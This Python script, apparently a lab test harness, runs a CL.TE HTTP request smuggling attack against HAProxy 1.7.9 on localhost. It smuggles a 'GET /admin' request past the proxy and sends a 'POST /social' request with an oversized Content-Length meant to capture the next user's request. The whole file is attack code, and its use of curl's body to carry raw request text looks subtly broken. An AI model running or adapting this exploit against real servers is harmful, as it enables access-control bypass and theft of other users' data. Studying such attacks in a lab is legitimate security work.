#!/usr/bin/env python3

import subprocess
import time

HAPROXY_HOST = 'localhost'
HAPROXY_PORT = 9000

def attack():
    """Simple CL.TE attack for HAProxy 1.7.9 using curl"""
    print("\n[SIMPLE CL.TE] Basic content-length/transfer-encoding")
    print("-" * 60)
    
    # First request (equivalent to original request)
    request1_data = (
        "POST / HTTP/1.1\r\n"
        "Host: localhost:9000\r\n"
        "Content-Length: 31\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET /admin HTTP/1.1\r\n"
        "x-foo: x"
    )
    
    # Second request (equivalent to original request2)  
    request2_data = (
        "POST / HTTP/1.1\r\n"
        "Host: localhost:9000\r\n"
        "Content-Length: 255\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "POST /social HTTP/1.1\r\n"
        "Host: localhost:9000\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 90\r\n\r\n"
        "x="
    )
    
    try:
        # Send first request with curl
        print("Sending request 1...")
        cmd1 = [
            'curl', '-v', '--raw',
            '--data-raw', request1_data,
            f'http://{HAPROXY_HOST}:{HAPROXY_PORT}/'
        ]
        
        result1 = subprocess.run(cmd1, capture_output=True, text=True, timeout=10)
        print("Response 1:")
        print(result1.stdout)
        
        time.sleep(0.5)
        
        # Send second request with curl  
        print("\nSending request 2...")
        cmd2 = [
            'curl', '-v', '--raw',
            '--data-raw', request2_data,
            f'http://{HAPROXY_HOST}:{HAPROXY_PORT}/'
        ]
        
        result2 = subprocess.run(cmd2, capture_output=True, text=True, timeout=10)
        print("Response 2:")
        print(result2.stdout)
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    print("=" * 60)
    print("HAProxy 1.7.9 Request Smuggling Tests")
    print("=" * 60)
    
    attack()

if __name__ == "__main__":
    main()
